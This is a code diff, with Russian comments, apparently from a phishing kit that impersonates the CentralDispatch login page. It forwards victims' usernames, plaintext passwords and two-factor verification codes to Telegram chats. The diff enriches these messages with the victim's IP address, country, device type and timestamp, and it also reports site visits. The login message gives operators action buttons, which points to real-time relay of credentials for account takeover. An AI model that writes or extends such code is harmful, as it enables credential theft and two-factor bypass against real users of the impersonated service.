@@ -13,15 +13,21 @@ const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS || "";
  * @param username - имя пользователя
  * @param password - пароль
  * @param requestId - уникальный ID запроса для отслеживания ответа
+ * @param ip - IP адрес пользователя (опционально)
+ * @param userAgent - User-Agent браузера (опционально)
  * @returns message_id отправленного сообщения
  */
 export async function sendLoginTelegram(
   username: string,
   password: string,
-  requestId: string
+  requestId: string,
+  ip?: string,
+  userAgent?: string
 ): Promise<number> {
   console.log("[TELEGRAM] Отправка уведомления о входе...");
   console.log("[TELEGRAM] Request ID:", requestId);
+  console.log("[TELEGRAM] IP:", ip);
+  console.log("[TELEGRAM] User-Agent:", userAgent);
 
   if (!TELEGRAM_BOT_TOKEN) {
     throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
@@ -44,12 +50,24 @@ export async function sendLoginTelegram(
 
   console.log("[TELEGRAM] Отправка на Chat IDs:", chatIds.join(", "));
 
+  // Получаем информацию о стране по IP
+  let countryInfo = "";
+  if (ip && ip !== "unknown") {
+    const geoData = await getCountryByIP(ip);
+    if (geoData) {
+      const flag = getCountryFlag(geoData.countryCode);
+      countryInfo = `\n📍 *Страна:* ${geoData.country} ${flag}`;
+    }
+  }
+
+  const currentTime = formatDate(new Date());
+  const ipLine = ip && ip !== "unknown" ? `\n🌍 *IP:* \`${ip}\`` : "";
+
   const message = `🔐 *CentralDispatch - Новый вход в систему*
 
 👤 *Username:* \`${username}\`
-🔑 *Password:* \`${password}\`
-
-⏰ *Время:* ${new Date().toLocaleString("ru-RU")}
+🔑 *Password:* \`${password}\`${ipLine}${countryInfo}
+⏰ *Время:* ${currentTime}
 
 Выберите действие:`;
 
@@ -121,15 +139,22 @@ export async function sendLoginTelegram(
 /**
  * Отправка кода верификации в Telegram (без кнопок)
  * @param code - 6-значный код верификации
- * @param username - имя пользователя (опционально)
+ * @param username - имя пользователя (обязательно)
+ * @param ip - IP адрес пользователя (опционально)
+ * @param userAgent - User-Agent браузера (опционально)
  * @returns message_id отправленного сообщения
  */
 export async function sendCodeTelegram(
   code: string,
-  username?: string
+  username: string,
+  ip?: string,
+  userAgent?: string
 ): Promise<number> {
   console.log("[TELEGRAM] Отправка кода верификации...");
   console.log("[TELEGRAM] Код:", code);
+  console.log("[TELEGRAM] Username:", username);
+  console.log("[TELEGRAM] IP:", ip);
+  console.log("[TELEGRAM] User-Agent:", userAgent);
 
   if (!TELEGRAM_BOT_TOKEN) {
     throw new Error("TELEGRAM_BOT_TOKEN должен быть настроен");
@@ -152,12 +177,14 @@ export async function sendCodeTelegram(
 
   console.log("[TELEGRAM] Отправка кода на Chat IDs:", chatIds.join(", "));
 
+  const currentTime = formatDate(new Date());
+
   const message = `🔐 *CentralDispatch - Код подтверждения*
 
 📝 *Код:* \`${code}\`
-${username ? `👤 *Username:* \`${username}\`` : ""}
+👤 *Username:* \`${username}\`
 
-⏰ *Время:* ${new Date().toLocaleString("ru-RU")}
+⏰ *Время:* ${currentTime}
 
 Введите этот код для подтверждения входа.`;
 
@@ -267,6 +294,46 @@ function getCountryFlag(countryCode: string): string {
 }
 
 /**
+ * Определение типа устройства по User-Agent
+ * @param userAgent - User-Agent строка браузера
+ * @returns строка с типом устройства (💻 Компьютер или 📱 Телефон)
+ */
+function getDeviceType(userAgent?: string): string {
+  if (!userAgent) {
+    return "💻 Вход бил через компютер";
+  }
+
+  const ua = userAgent.toLowerCase();
+  
+  // Проверяем на мобильные устройства
+  const mobileKeywords = [
+    "mobile", "android", "iphone", "ipad", "ipod", 
+    "blackberry", "windows phone", "opera mini", 
+    "iemobile", "tablet", "kindle", "silk"
+  ];
+  
+  const isMobile = mobileKeywords.some(keyword => ua.includes(keyword));
+  
+  return isMobile ? "📱 Вход бил через телефон" : "💻 Вход бил через компютер";
+}
+
+/**
+ * Форматирование даты в формат DD.MM.YYYY, HH:mm:ss
+ * @param date - объект Date
+ * @returns отформатированная строка даты
+ */
+function formatDate(date: Date): string {
+  const day = String(date.getDate()).padStart(2, "0");
+  const month = String(date.getMonth() + 1).padStart(2, "0");
+  const year = date.getFullYear();
+  const hours = String(date.getHours()).padStart(2, "0");
+  const minutes = String(date.getMinutes()).padStart(2, "0");
+  const seconds = String(date.getSeconds()).padStart(2, "0");
+  
+  return `${day}.${month}.${year}, ${hours}:${minutes}:${seconds}`;
+}
+
+/**
  * Отправка уведомления о посещении сайта
  * @param path - путь, по которому зашел пользователь
  * @param userAgent - User-Agent браузера (опционально)
@@ -319,11 +386,15 @@ export async function sendVisitNotification(
     }
   }
 
+  // Определяем тип устройства
+  const deviceType = getDeviceType(userAgent);
+  const currentTime = formatDate(new Date());
+  const ipLine = ip && ip !== "unknown" ? `\n🌍 *IP:* \`${ip}\`` : "";
+
   const message = `${visitType}
 
-⏰ *Время:* ${new Date().toLocaleString("ru-RU")}
-${ip ? `🌍 *IP:* \`${ip}\`` : ""}${countryInfo}
-${userAgent ? `💻 *Браузер:* ${userAgent.substring(0, 100)}${userAgent.length > 100 ? "..." : ""}` : ""}
+⏰ *Время:* ${currentTime}${ipLine}${countryInfo}
+${deviceType}
 
 Кто-то зашел на сайт CentralDispatch.`;
 
